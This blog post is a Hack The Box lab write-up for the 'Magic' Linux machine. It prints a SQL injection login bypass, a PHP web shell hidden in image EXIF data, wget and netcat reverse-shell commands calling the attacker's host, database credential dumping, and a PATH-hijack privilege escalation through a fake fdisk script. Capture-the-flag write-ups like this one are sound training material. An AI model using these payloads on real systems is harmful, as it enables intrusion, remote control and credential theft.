---
title: Magic
author: fieldraccoon
date: 2020-08-22
categories: [hack-the-box, linux]
tags: [hack-the-box, sqli, medium, sql]
math: true
---

Magic was a medium linux machine that involved sql injection to get access to an image upload feature. We upload our malicious image to get a shell on the target system. Enumerating for credentials exposes mysql creds that we use to dump the password for the user. Root was explpoitation of fdisk and sysinfo to get a root reverse shell.

# Summary@Magic

- Exploiting SQLI to bypass login
- Using exiftool to embed a php command exec feature into the image
- Uploading the image
- Testing we can run commands
- Run reverse shell
- Find `db.php5` with credentials
- Use `mysqldump` to dump the password for user `theseus`
- User.txt
- Locating `sysinfo` custom binary
- Adding reverse shell to our `fdisk` file
- Exporting `$PATH`
- running `sysinfo` to get a root shell

# User

As always we run `nmap -sC -sV -o nmap 10.10.10.185` to begin our recon.

```bash
┌──(kali㉿kali)-[~/htb/boxes/magic]
└─$ nmap -sC -sV -o nmap 10.10.10.185
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 11:55 EDT
Nmap scan report for 10.10.10.185
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.74 seconds
```

The scan shows that port 22 on ssh and port 80 on http are open:


## Port 80

Navigating to the website gives us a portfolio of images.

The website seems to be a an image hosting and sharing platform where you can upoload your pictures and then they will be displayed.

![home page](https://i.ibb.co/fDgw3CN/magic-home-screen.png)

We see the `text` login in the bottom left of the screen. We click on this and it forwards us to a login screen.

## Sql login
![login-screen](https://i.ibb.co/VgwwQBj/magic-login-page.png)

We start by testing simple Sqlinjection payloads such as `' OR 1=1` and experimenting with `"` and `;` to try and tweak it to give us access. We finally come to our final command that works. It is:

```
admin' or 1=1; --';
```

![sqllogin](https://i.ibb.co/1LGvzN5/mage-sqli-login-page.png)

After this we are exposed to the image upload feature that we assumed we would get at some point.
We test uploading sample images to see what extensions we can get away with and in fact if we name a file `file.php.jpeg` we can get away with executing the php part of it as the website only seems to make sure that the final file extension is either png, jpg or jpeg.

![uploadpage](https://i.ibb.co/mDpynkt/upload-image.png)

## exiftool

We will now use `exiftool` to embed some php code into our image.

We will use this code: `<?php echo "<pre>"; system($_GET['cmd']); ?>`. This allows us to once we upload and head to our file in the url e.g http://website.com/image.php.jpeg insert our own command and allow us to get code execution with it.

```bash
┌──(kali㉿kali)-[~/htb/boxes/magic]
└─$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.jpeg
    1 image files updated
```

## Uploading image

We then upload the image to the site.

![imageupload](https://i.ibb.co/jWP8JM3/image-uploaded-success.png) 

## Code execution

And then navigate to this url:

`http://10.10.10.185/images/uploads/image.php.jpeg?cmd=`

We can now run commands.

We run `ls` as a test to see if it works and it does in fact work.

![ls](https://i.ibb.co/3F25csK/ls.png)

We will now try to get a shell on our box.

I will use `wget` in the url to get a php reverse shell from my box. I will then navigate to this file and run it.

I will then get a connection back on my listener.

I run this command to get the file from my box onto the machine:

```
http://10.10.10.185/images/uploads/image.php.jpeg?cmd=wget%20http://10.10.14.26:8000/php-reverse-shell.php
```

I also have a python server running with `python -m http.server` to establish the connection between the 2 machines.

Once we get the reverse shell onto the machine we go to it with the url:

```
http://10.10.10.185/images/uploads/php-reverse-shell.php
```
## Shell as `www-data`

We then get a connection back on our listener.

```bash
┌──(kali㉿kali)-[~/htb/boxes/magic]
└─$ nc -nlvp 1234                    
listening on [any] 1234 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.185] 38866
Linux ubuntu 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 10:17:28 up 10:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
## Enumeration
After this we enumerate files on the box. We come accross a file called `db.php5` which when reading it reveals credentials for the `mysql` database.

We will use this to get our user credentials.

```bash
pwd 
/var/www/Magic
cat db.php5   
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
```

We find a database file in /var/www/Magic


```bash
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
```
## Mysqldump

We will now attempt to use `mysqldump` with theese. `Mysql` is not installed on the box that is why we are using `mysqldump`

```bash
$ mysqldump -u theseus --password=iamkingtheseus --single-transaction --all-databases
<iamkingtheseus --single-transaction --all-databases
```

```sql
$ mysqldump -u theseus --password=iamkingtheseus --single-transaction --all-databases
<iamkingtheseus --single-transaction --all-databases
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: 
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `Magic`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `Magic` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `Magic`;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
```

We see this in the returned output
```sql
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
```
## User.txt
We can simply su theseus with this information to ascend our access privelages past www-data

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/$ su - theseus
su - theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:~$ cat /home/theseus/user.txt
cat /home/theseus/user.txt
ca4d{...}
```

We also spawn a tty shell as using the binary `su` needs a proper terminal so we can go ahead and read the flag.



# Root

## Enumeration

After some enum we find a binary called sysinfo which is infact a custom built bianry.

we will use the $PATH environment variable in conjunction with a bash script and sysinfo.

## The attack
Here is the basic login of our attack:

We will set the `$PATH` as `/tmp` where our file will be located. This will make sysinfo use fdisk so that we can create a custom script which will run containing a netcat command that we will place inside to try and get our reverse shell as root.


```bash
theseus@ubuntu:~$ wget http://10.10.14.26:8000/nc                                                      
wget http://10.10.14.26:8000/nc                                                                        
--2020-08-21 10:31:03--  http://10.10.14.26:8000/nc                                                    
Connecting to 10.10.14.26:8000... connected.                                                           
HTTP request sent, awaiting response... 200 OK                                                         
Length: 35520 (35K) [application/octet-stream]                                                         
Saving to: ‘nc’                                                                                        
                                                                                                       
nc                  100%[===================>]  34.69K  --.-KB/s    in 0.03s                           
                                                                                                       
2020-08-21 10:31:03 (1.07 MB/s) - ‘nc’ saved [35520/35520] 
```
We transfer `nc` to the magic box.

We then echo our nc connection shell to our file

```bash
theseus@ubuntu:/tmp$ echo "/tmp/nc -e /bin/bash 10.10.14.26 1234" >> fdisk
echo "/tmp/nc -e /bin/bash 10.10.14.26 1234" >> fdisk
```

Then `chmod +x fdisk`

Do this also for `nc` 
```
theseus@ubuntu:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
```
Then make sure that you run `chmod 755` on `fdisk` and run `sysinfo`

##  Root.txt
Then we get a connection back on our listener as root!
```
┌──(kali㉿kali)-[~/tools]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.185] 38872
id && hostname
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
ubuntu
```

Thanks for reading hope that you enjoyed! If it was worth the read please go and support me on buymeacoffee it would mean so much if you do!
